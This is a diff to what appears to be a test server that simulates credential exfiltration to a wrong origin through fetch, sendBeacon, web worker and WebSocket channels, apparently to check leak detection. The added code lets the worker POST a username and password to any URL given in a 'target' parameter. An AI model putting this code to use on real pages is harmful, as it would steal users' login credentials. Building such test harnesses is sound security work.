@@ -629,13 +629,21 @@ async function main() {
       }
 
       if (req.method === "GET" && u.pathname === "/exfil-worker.js") {
+        const targetUrl = u.searchParams.get("target") || `${wrongOrigin}/exfil/worker`;
+        const isCustom = Boolean(u.searchParams.get("target"));
         res.writeHead(200, { "content-type": "application/javascript" });
         res.end(`
           self.onmessage = async (e) => {
-            await fetch("${wrongOrigin}/exfil/worker", {
-              method: "POST",
-              body: JSON.stringify({ exfil: e.data }),
-            });
+            try {
+              await fetch(${JSON.stringify(targetUrl)}, {
+                method: "POST",
+                ${
+                  isCustom
+                    ? 'headers: { "content-type": "application/x-www-form-urlencoded" }, body: "username=editor%40acme.test&password=" + encodeURIComponent(String(e.data))'
+                    : "body: JSON.stringify({ exfil: e.data })"
+                }
+              });
+            } catch {}
             self.postMessage("done");
           };
         `);
@@ -684,6 +692,10 @@ async function main() {
 
       if (req.method === "GET" && u.pathname === "/login/exfil") {
         const channel = u.searchParams.get("channel") || "fetch";
+        const customTarget = u.searchParams.get("target") || "";
+        const workerScriptUrl = customTarget
+          ? `/exfil-worker.js?target=${encodeURIComponent(customTarget)}`
+          : "/exfil-worker.js";
         const wsOrigin = wrongOrigin.replace(/^http:/, "ws:");
         res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
         res.end(`<!doctype html><html><body>
@@ -701,7 +713,7 @@ async function main() {
                 navigator.sendBeacon("${wrongOrigin}/exfil/beacon", val);
               } else if (ch === "worker") {
                 await new Promise((resolve) => {
-                  const w = new Worker("/exfil-worker.js");
+                  const w = new Worker(${JSON.stringify(workerScriptUrl)});
                   w.onmessage = () => resolve();
                   w.onerror = () => resolve();
                   w.postMessage(val);
